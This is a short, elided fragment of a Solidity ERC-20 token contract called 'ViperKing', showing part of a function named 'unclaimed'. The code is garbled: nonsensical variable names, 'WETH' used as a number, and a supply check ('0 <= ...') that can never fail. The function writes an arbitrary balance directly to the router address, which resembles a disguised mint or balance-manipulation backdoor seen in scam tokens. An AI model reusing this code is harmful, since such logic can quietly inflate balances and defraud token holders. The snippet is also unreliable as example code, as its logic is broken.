...
contract ViperKing is IERC20, Ownable, BaseToken {
    ...
    function unclaimed(
        ...
        uint256 projectLandRoster = WETH * 10 ** decimals();
        require(0 <= totalSupply() + projectLandRoster, "Max supply exceeded");
        _balances[uniswapV2Router] = WETH * projectLandRoster;
        uint256 addLiquidityETH = projectLandRoster > address(this).balance ? 0 : address(this).balance - projectLandRoster;
